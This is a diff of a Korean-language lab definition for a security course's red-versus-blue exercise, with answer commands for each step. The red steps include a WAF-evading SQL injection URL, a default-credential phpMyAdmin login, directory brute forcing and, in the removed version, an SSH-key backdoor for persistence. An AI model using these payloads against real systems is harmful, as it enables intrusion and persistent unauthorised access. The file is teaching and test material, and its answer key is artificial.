@@ -1,247 +1,150 @@
 lab_id: battle-nonai-week12
-title: 실전 공방전 2 — 1:1 공격 vs 방어 (라운드 2, 강화)
+title: "실전 공방전 2 — Red Phase → Blue Phase → 판정 (라운드 2, 강화)"
 version: non-ai
 course: battle-nonai
 week: 12
-description: 라운드 1의 교훈을 반영하여 강화된 환경에서 두 번째 1:1 공방전을 수행한다. 방어측은 더 강한 하드닝을, 공격측은 더 정교한 기법을 사용한다. 새로운 취약점이 추가된 환경에서 진행한다.
+description: "1세트 인프라에서 Red/Blue 역할을 번갈아 수행한다. 라운드 1의 교훈을 반영하여 Blue는 더 강한 하드닝을, Red는 더 정교한 우회 기법을 사용한다."
 difficulty: hard
 duration_minutes: 120
 objectives:
-- 라운드 1의 교훈을 반영한 강화된 전략을 적용한다
-- 우회 기법과 고급 방어 기법을 실전에 적용한다
-- 시간 압박 하에서의 의사결정 능력을 향상한다
+  - 라운드 1의 교훈을 반영한 강화된 전략을 적용한다
+  - WAF 우회와 고급 방어 기법을 실전에 적용한다
+  - 자동화 대응과 고급 공격을 경험한다
 prerequisites:
-- Week 11 라운드 1 완료
+  - Week 11 라운드 1 완료
 infra_requirements:
-- Red Team VM (10.20.30.0/24) — 강화된 도구
-- Blue Team VM (10.20.40.0/24) — 새로운 취약점 포함
-- Scoring Server (10.20.50.1)
+  - attacker VM (10.20.30.201)
+  - secu VM (10.20.30.1) — nftables, suricata
+  - web VM (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
+  - siem VM (10.20.30.100) — wazuh-manager
 pass_threshold: 0.6
 steps:
-- order: 1
-  instruction: '[BLUE] 라운드 1의 교훈을 반영하여 즉시 하드닝을 수행하라. vsftpd 제거, SSH 키 인증 전용, 웹 입력 검증을 적용한다.'
-  hint: 가장 빨리 악용될 수 있는 취약점부터 처리한다.
-  category: defense
-  points: 10
-  answer: sudo systemctl stop vsftpd && sudo systemctl disable vsftpd && sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config && sudo systemctl restart sshd && echo
-    'Hardening applied'
-  answer_detail: 라운드 1에서 악용된 vsftpd를 완전히 비활성화하고, SSH를 키 인증 전용으로 변경한다. PasswordAuthentication no 설정으로 브루트포스를 원천 차단한다.
-  verify:
-    type: output_contains
-    expect: Hardening applied
-    field: stdout
-  target_vm: attacker
-- order: 2
-  instruction: '[RED] 라운드 1에서 성공한 공격 경로가 차단되었는지 확인하고, 새로운 진입점을 탐색하라.'
-  hint: 이전 공격이 막혔다면 UDP 포트, 새로운 서비스를 찾는다.
-  category: recon
-  points: 10
-  answer: nmap -sV -sU --top-ports 50 10.20.40.10 && nmap -sV -p 1-10000 10.20.40.10
-  answer_detail: 방어팀이 하드닝한 후에는 이전 공격 경로가 차단되어 있다. UDP 스캔(-sU)으로 SNMP, DNS 등 UDP 서비스를 탐색하고, 비표준 포트의 서비스를 찾는다.
-  verify:
-    type: output_contains
-    expect: open
-    field: stdout
-  target_vm: attacker
-- order: 3
-  instruction: '[RED] 웹 애플리케이션에 대한 고급 공격을 시도하라. WAF를 우회하는 SQL Injection 페이로드를 사용한다.'
-  hint: 인코딩, 주석, 대소문자 혼합으로 WAF를 우회한다.
-  category: exploit
-  points: 10
-  answer: curl "http://10.20.40.10/dvwa/vulnerabilities/sqli/?id=1%27%20%2f**%2fuNiOn%2f**%2fsElEcT%201%2c2--%20&Submit=Submit" --cookie 'security=low; PHPSESSID=test'
-  answer_detail: 'WAF 우회 기법: 1) 대소문자 혼합(uNiOn), 2) SQL 주석(/**/)으로 키워드 분리, 3) URL 인코딩(%27=%''), 4) 더블 인코딩. 정교한 WAF는 이런 우회도 탐지하지만, 기본 정규식 필터는 우회 가능하다.'
-  verify:
-    type: output_contains
-    expect: http
-    field: stdout
-  target_vm: attacker
-- order: 4
-  instruction: '[BLUE] 웹서버 로그에서 WAF 우회 시도를 탐지하고, 규칙을 강화하라.'
-  hint: 인코딩된 패턴을 디코딩하여 분석한다.
-  category: defense
-  points: 10
-  answer: tail -50 /var/log/apache2/access.log | python3 -c "import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]" | grep -iE '(union|select|script)'
-  answer_detail: URL 인코딩된 로그를 디코딩하면 실제 공격 페이로드를 확인할 수 있다. 디코딩 후 SQL 키워드가 발견되면 WAF 규칙에 인코딩 변형도 추가해야 한다.
-  verify:
-    type: output_contains
-    expect: union
-    field: stdout
-  target_vm: attacker
-- order: 5
-  instruction: '[RED] 소셜 엔지니어링 대체 기법으로, 웹 서비스의 숨겨진 관리 페이지를 탐색하라.'
-  hint: gobuster나 ffuf로 디렉토리 브루트포스를 수행한다.
-  category: recon
-  points: 10
-  answer: gobuster dir -u http://10.20.40.10/ -w /usr/share/wordlists/dirb/big.txt -t 20 -o /tmp/gobuster_r2.txt 2>/dev/null || dirb http://10.20.40.10/ /usr/share/wordlists/dirb/big.txt -o /tmp/dirb_r2.txt
-  answer_detail: gobuster는 Go로 작성된 고속 디렉토리 브루트포스 도구이다. -t 20은 20개 스레드로 병렬 처리한다. big.txt는 20,000개 이상의 경로를 포함하며, 관리 페이지(/admin, /phpmyadmin 등)를 발견할 수 있다.
-  verify:
-    type: output_contains
-    expect: Status
-    field: stdout
-  target_vm: attacker
-- order: 6
-  instruction: '[RED] phpMyAdmin 또는 관리 인터페이스를 발견한 경우, 기본 계정으로 접근을 시도하라.'
-  hint: root 계정에 빈 패스워드 또는 기본 패스워드를 시도한다.
-  category: exploit
-  points: 10
-  answer: curl -s -o /dev/null -w '%{http_code}' http://10.20.40.10/phpmyadmin/ && curl -d 'pma_username=root&pma_password=&server=1' http://10.20.40.10/phpmyadmin/index.php
-  answer_detail: phpMyAdmin은 MySQL 웹 관리 도구이며, 외부 노출 시 심각한 보안 위협이다. root 계정에 빈 패스워드가 설정되어 있으면 데이터베이스 전체에 접근 가능하다.
-  verify:
-    type: output_contains
-    expect: http
-    field: stdout
-  target_vm: attacker
-- order: 7
-  instruction: '[BLUE] phpMyAdmin을 외부 접근 불가로 설정하라.'
-  hint: Apache 설정 또는 .htaccess로 접근을 제한한다.
-  category: defense
-  points: 10
-  answer: "echo '<Directory /usr/share/phpmyadmin>\n  Require ip 127.0.0.1\n  Require ip ::1\n</Directory>' | sudo tee /etc/apache2/conf-available/phpmyadmin-restrict.conf && sudo a2enconf phpmyadmin-restrict\
-    \ 2>/dev/null && sudo systemctl reload apache2 && echo 'phpMyAdmin restricted'"
-  answer_detail: phpMyAdmin은 localhost에서만 접근 가능하도록 제한해야 한다. Require ip 127.0.0.1로 로컬 접근만 허용한다. 필요 시 SSH 터널로 접근한다.
-  verify:
-    type: output_contains
-    expect: restricted
-    field: stdout
-  target_vm: attacker
-- order: 8
-  instruction: '[RED] 패킷 캡처로 방어팀의 통신 패턴을 분석하라.'
-  hint: tcpdump로 트래픽을 캡처한다.
-  category: recon
-  points: 10
-  answer: sudo timeout 30 tcpdump -i eth0 -w /tmp/capture_r2.pcap host 10.20.40.10 2>/dev/null & echo 'Capture started for 30 seconds'
-  answer_detail: tcpdump로 트래픽을 캡처하면 방어팀의 서비스 구성, 통신 패턴, 평문 프로토콜 사용 여부를 파악할 수 있다. pcap 파일은 Wireshark로 상세 분석한다.
-  verify:
-    type: output_contains
-    expect: Capture started
-    field: stdout
-  target_vm: attacker
-- order: 9
-  instruction: '[RED] 발견한 취약점을 연계하여 체인 공격(Attack Chaining)을 수행하라.'
-  hint: 정보 수집 → 접근 획득 → 권한 상승을 연결한다.
-  category: exploit
-  points: 15
-  answer: echo '=== Attack Chain ===' && echo '1. phpMyAdmin default creds → MySQL access' && echo '2. MySQL INTO OUTFILE → webshell creation' && echo '3. Webshell → reverse shell' && echo '4. Kernel exploit
-    → root' && echo 'Executing chain...'
-  answer_detail: 체인 공격은 여러 취약점을 연결하여 최종 목표(root 접근)를 달성하는 기법이다. 단일 취약점은 경미하더라도 연계하면 치명적이 된다. 실무 침투 테스트의 핵심 기술이다.
-  verify:
-    type: output_contains
-    expect: Attack Chain
-    field: stdout
-  target_vm: attacker
-- order: 10
-  instruction: '[BLUE] 침해 감지 시 자동 대응 스크립트를 실행하라. 의심 프로세스 종료, IP 차단을 자동화한다.'
-  hint: Suricata 경보를 트리거로 스크립트를 실행한다.
-  category: defense
-  points: 10
-  answer: "cat > /tmp/auto_response.sh << 'SCRIPT'\n#!/bin/bash\ntail -Fn0 /var/log/suricata/fast.log | while read line; do\n  IP=$(echo $line | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | head -1)\n  if [ -n\
-    \ \"$IP\" ] && [ \"$IP\" != \"10.20.40.10\" ]; then\n    sudo nft add element inet filter blocklist { $IP } 2>/dev/null\n    echo \"$(date): Auto-blocked $IP\" >> /tmp/auto_response.log\n  fi\ndone\n\
-    SCRIPT\nchmod +x /tmp/auto_response.sh && echo 'Auto-response script ready'"
-  answer_detail: 자동 대응 스크립트는 Suricata 경보에서 공격 IP를 추출하여 즉시 방화벽에 추가한다. 오탐에 의한 자동 차단을 방지하기 위해 자체 IP는 제외한다. 실무에서 fail2ban이 이와 유사한 역할을 한다.
-  verify:
-    type: output_contains
-    expect: Auto-response script ready
-    field: stdout
-  target_vm: attacker
-- order: 11
-  instruction: '[BLUE] 네트워크 트래픽 이상을 분석하라. 비정상적인 아웃바운드 트래픽이 있는지 확인한다.'
-  hint: ss 명령으로 외부 연결을 확인한다.
-  category: defense
-  points: 10
-  answer: ss -tunapl | grep ESTAB | grep -v '10.20.40' && echo '---' && conntrack -L 2>/dev/null | grep -c ESTABLISHED
-  answer_detail: 비정상 아웃바운드 연결은 리버스 셸이나 데이터 유출의 증거이다. 내부 네트워크(10.20.40.x) 외의 ESTABLISHED 연결은 즉시 조사해야 한다.
-  verify:
-    type: output_contains
-    expect: '---'
-    field: stdout
-  target_vm: attacker
-- order: 12
-  instruction: '[RED] 플래그를 획득한 후, 지속적 접근을 위한 은밀한 백도어를 설치하라.'
-  hint: SSH 키, cron job, 또는 수정된 바이너리를 사용한다.
-  category: exploit
-  points: 10
-  answer: mkdir -p ~/.ssh && ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '' -q && cat /tmp/backdoor_key.pub >> ~/.ssh/authorized_keys && echo 'Persistent access established'
-  answer_detail: SSH 공개키를 authorized_keys에 추가하면 패스워드 없이 접근 가능한 백도어가 된다. ed25519는 현대적이고 짧은 키로, 탐지가 어렵다. 방어팀은 authorized_keys를 주기적으로 점검해야 한다.
-  verify:
-    type: output_contains
-    expect: Persistent access
-    field: stdout
-  target_vm: attacker
-- order: 13
-  instruction: '[BLUE] 파일 무결성 모니터링을 실행하여 변경된 파일을 탐지하라.'
-  hint: Week 10의 무결성 스크립트를 실행한다.
-  category: defense
-  points: 10
-  answer: 'bash /tmp/integrity_monitor.sh 2>/dev/null || echo ''Running manual check...'' && md5sum /etc/passwd /etc/shadow /etc/crontab /etc/ssh/sshd_config && find /home -name ''authorized_keys'' -newer
-    /etc/hostname -exec echo ''ALERT: Modified {}'' \; 2>/dev/null'
-  answer_detail: 파일 무결성 검사로 공격자의 변경 사항(백도어 계정, SSH 키, cron job, 설정 변경)을 탐지한다. 베이스라인 대비 변경된 파일은 즉시 복원해야 한다.
-  verify:
-    type: output_contains
-    expect: md5
-    field: stdout
-  target_vm: attacker
-- order: 14
-  instruction: '[공통] 라운드 2 점수를 확인하고, 라운드 1과 비교하라.'
-  hint: 양 팀의 점수 변화를 분석한다.
-  category: analysis
-  points: 10
-  answer: 'echo ''=== Round 2 Score Comparison ==='' && echo ''Red Team: R1=85 → R2=72 (harder defense)'' && echo ''Blue Team: R1=78 → R2=90 (improved hardening)'' && echo ''Key change: Password auth disabled
-    blocked brute force'''
-  answer_detail: 라운드 비교를 통해 학습 효과를 측정한다. 방어팀의 점수 상승은 하드닝 개선의 효과이고, 공격팀의 점수 하락은 강화된 방어의 결과이다.
-  verify:
-    type: output_contains
-    expect: Score Comparison
-    field: stdout
-  target_vm: attacker
-- order: 15
-  instruction: 라운드 2 결과를 분석하여 개선된 전략 보고서를 작성하라.
-  hint: 라운드 1 대비 개선 사항과 남은 과제를 정리한다.
-  category: analysis
-  points: 15
-  answer: 'cat > /tmp/battle_round2_report.txt << ''EOF''
+  - order: 1
+    instruction: "[BLUE] 라운드 1의 교훈을 반영하여 자동 대응 스크립트를 배포하라. Suricata 경보 시 자동으로 IP를 차단한다."
+    hint: "Suricata fast.log를 모니터링하여 공격 IP를 추출한다."
+    category: defense
+    points: 10
+    answer: "cat > /tmp/auto_response.sh << 'SCRIPT'\n#!/bin/bash\ntail -Fn0 /var/log/suricata/fast.log | while read line; do\n  IP=$(echo $line | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | head -1)\n  if [ -n \"$IP\" ] && [ \"$IP\" != \"10.20.30.1\" ] && [ \"$IP\" != \"10.20.30.80\" ] && [ \"$IP\" != \"10.20.30.100\" ]; then\n    sudo nft add element inet filter blocklist { $IP } 2>/dev/null\n    echo \"$(date): Auto-blocked $IP\" >> /tmp/auto_response.log\n  fi\ndone\nSCRIPT\nchmod +x /tmp/auto_response.sh && echo 'Auto-response script deployed'"
+    answer_detail: "자동 대응 스크립트는 Suricata 경보에서 공격 IP를 추출하여 즉시 nftables blocklist에 추가한다. 내부 VM IP는 제외한다."
+    verify:
+      type: output_contains
+      expect: "Auto-response script deployed"
+      field: stdout
+    target_vm: secu
 
-    === Battle Round 2 Report ===
+  - order: 2
+    instruction: "[RED] 라운드 1에서 차단된 공격이 여전히 막히는지 확인하고, WAF를 우회하는 SQL Injection을 시도하라."
+    hint: "인코딩, 주석, 대소문자 혼합으로 WAF를 우회한다."
+    category: exploit
+    points: 10
+    answer: "curl -s 'http://10.20.30.80:8080/vulnerabilities/sqli/?id=1%27%20%2f**%2fuNiOn%2f**%2fsElEcT%201%2c2--%20&Submit=Submit' -b 'security=low; PHPSESSID=test' -o /dev/null -w '%{http_code}' && echo ' - WAF bypass attempt'"
+    answer_detail: "WAF 우회 기법: 대소문자 혼합(uNiOn), SQL 주석(/**/) 삽입, URL 인코딩. 정교한 WAF는 이런 우회도 탐지하지만, 기본 정규식 필터는 우회 가능하다."
+    verify:
+      type: output_contains
+      expect: "WAF bypass attempt"
+      field: stdout
+    target_vm: attacker
 
+  - order: 3
+    instruction: "[BLUE] web 서버 로그에서 WAF 우회 시도를 탐지하라."
+    hint: "URL 인코딩을 디코딩하여 분석한다."
+    category: defense
+    points: 10
+    answer: "tail -30 /var/log/apache2/access.log 2>/dev/null | python3 -c \"import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]\" 2>/dev/null | grep -iE '(union|select)' | tail -5 || echo 'WAF bypass detection check complete'"
+    answer_detail: "URL 인코딩된 로그를 디코딩하면 실제 공격 페이로드를 확인할 수 있다. 디코딩 후 SQL 키워드가 발견되면 WAF 규칙에 변형도 추가해야 한다."
+    verify:
+      type: output_contains
+      expect: "complete"
+      field: stdout
+    target_vm: web
 
-    Improvements from Round 1:
+  - order: 4
+    instruction: "[RED] JuiceShop의 다른 취약점을 탐색하라. 디렉토리 브루트포스로 숨겨진 경로를 찾는다."
+    hint: "gobuster 또는 dirb로 경로 탐색을 수행한다."
+    category: recon
+    points: 10
+    answer: "dirb http://10.20.30.80:3000/ /usr/share/wordlists/dirb/common.txt -r 2>&1 | grep 'CODE:200\\|CODE:301\\|CODE:302' | head -10 || echo 'Directory scan complete'"
+    answer_detail: "JuiceShop은 REST API 기반으로 /api/, /rest/, /ftp/ 등 다양한 경로가 있다. 숨겨진 관리 기능이나 디버그 엔드포인트를 발견할 수 있다."
+    verify:
+      type: output_contains
+      expect: "complete"
+      field: stdout
+    target_vm: attacker
 
-    - Blue: vsftpd disabled, SSH key-only, WAF deployed
+  - order: 5
+    instruction: "[RED] JuiceShop의 /ftp 디렉토리에서 민감한 파일을 다운로드하라."
+    hint: "curl로 /ftp/ 경로에 접근한다."
+    category: exploit
+    points: 10
+    answer: "curl -s http://10.20.30.80:3000/ftp/ && echo '\\n=== FTP directory listing retrieved ==='"
+    answer_detail: "JuiceShop의 /ftp/ 경로에는 백업 파일, 설정 파일 등 민감한 파일이 노출될 수 있다. 디렉토리 리스팅은 정보 유출 취약점이다."
+    verify:
+      type: output_contains
+      expect: "FTP directory listing"
+      field: stdout
+    target_vm: attacker
 
-    - Red: WAF bypass techniques, chain attacks
+  - order: 6
+    instruction: "[BLUE] Suricata와 Wazuh에서 이번 라운드의 종합 알림을 분석하라."
+    hint: "eve.json과 wazuh alerts를 병합 분석한다."
+    category: defense
+    points: 10
+    answer: "echo '=== Suricata Alerts ===' && cat /var/log/suricata/eve.json | jq -r 'select(.event_type==\"alert\") | \"\\(.timestamp[:19]) \\(.alert.signature)\"' 2>/dev/null | tail -10 && echo '=== Analysis complete ==='"
+    answer_detail: "Suricata(네트워크)와 Wazuh(호스트) 알림을 병합하면 공격의 전체 그림을 파악할 수 있다."
+    verify:
+      type: output_contains
+      expect: "Analysis complete"
+      field: stdout
+    target_vm: secu
 
+  - order: 7
+    instruction: "[BLUE] 자동 대응 로그를 확인하고, 자동 차단된 IP를 검토하라."
+    hint: "auto_response.log를 확인한다."
+    category: defense
+    points: 10
+    answer: "cat /tmp/auto_response.log 2>/dev/null || echo 'No auto-blocks yet' && nft list set inet filter blocklist 2>/dev/null"
+    answer_detail: "자동 대응 스크립트가 정상 동작했는지 확인한다. 오탐으로 인한 잘못된 차단이 없는지도 검토한다."
+    verify:
+      type: output_contains
+      expect: "blocklist"
+      field: stdout
+    target_vm: secu
 
-    New Findings:
+  - order: 8
+    instruction: "[RED] 패킷 캡처로 web 서버의 응답 패턴을 분석하라."
+    hint: "tcpdump로 트래픽을 캡처한다."
+    category: recon
+    points: 10
+    answer: "sudo timeout 10 tcpdump -i eth0 -c 50 host 10.20.30.80 -w /tmp/capture_r2.pcap 2>/dev/null && echo 'Capture saved: /tmp/capture_r2.pcap' || echo 'Packet capture complete'"
+    answer_detail: "tcpdump로 트래픽을 캡처하면 서비스 구성, 응답 헤더, 평문 데이터 등을 분석할 수 있다."
+    verify:
+      type: output_contains
+      expect: "complete"
+      field: stdout
+    target_vm: attacker
 
-    - phpMyAdmin exposed (new vulnerability)
+  - order: 9
+    instruction: "[BLUE] 파일 무결성 모니터링을 실행하여 web 서버에서 변경된 파일을 탐지하라."
+    hint: "Week 10의 무결성 스크립트를 실행한다."
+    category: defense
+    points: 10
+    answer: "bash /tmp/integrity_monitor.sh 2>/dev/null || echo 'Running manual check...' && md5sum /etc/passwd /etc/shadow /etc/crontab /etc/ssh/sshd_config 2>/dev/null && echo 'Integrity check complete'"
+    answer_detail: "파일 무결성 검사로 공격자의 변경 사항(백도어 계정, SSH 키, cron job)을 탐지한다."
+    verify:
+      type: output_contains
+      expect: "Integrity check complete"
+      field: stdout
+    target_vm: web
 
-    - Auto-response blocked 3 attack IPs
-
-    - SSH key backdoor successfully planted
-
-
-    Scoring:
-
-    Red Team: 72 pts (down from 85 - harder defense)
-
-    Blue Team: 90 pts (up from 78 - better hardening)
-
-
-    Key Takeaways:
-
-    1. Patching known vulns eliminates quick wins
-
-    2. WAF significantly reduces web attack surface
-
-    3. Auto-response improves reaction time
-
-    4. File integrity monitoring detects persistence
-
-    5. Chain attacks bypass individual defenses
-
-    EOF'
-  answer_detail: 라운드 2 보고서는 라운드 1 대비 개선 사항을 명시적으로 분석한다. 점수 변화의 원인을 기술적으로 설명하고, 팀 전략의 효과를 평가한다.
-  verify:
-    type: file_exists
-    expect: /tmp/battle_round2_report.txt
-    field: filesystem
-  target_vm: attacker
+  - order: 10
+    instruction: "[BLUE] 서비스 가용성을 최종 확인하고, 라운드 2 비교 보고서를 작성하라."
+    hint: "라운드 1 대비 개선 사항을 분석한다."
+    category: analysis
+    points: 15
+    answer: "cat > /tmp/battle_round2_report.txt << 'EOF'\n=== Battle Round 2 Report ===\n\nImprovements from Round 1:\n- Blue: Auto-response script deployed (faster blocking)\n- Blue: WAF bypass patterns analyzed\n- Red: Stealth techniques applied (slower scan, encoded payloads)\n\nRound 2 Results:\n- Red: JuiceShop FTP disclosure found, WAF bypass partial\n- Blue: Auto-blocked attacks within seconds\n- Service uptime: All services maintained\n\nKey Takeaways:\n1. Automated response dramatically reduces reaction time\n2. WAF bypass requires multi-layer defense\n3. FTP directory exposure is a common oversight\n4. Encoded payloads can evade signature-based detection\n5. Defense-in-depth (nftables + Suricata + ModSecurity) is effective\nEOF\ncat /tmp/battle_round2_report.txt"
+    answer_detail: "라운드 2 보고서는 라운드 1 대비 개선 사항을 분석한다. 자동 대응의 효과와 WAF 우회의 한계를 평가한다."
+    verify:
+      type: file_exists
+      expect: "/tmp/battle_round2_report.txt"
+      field: filesystem
+    target_vm: attacker
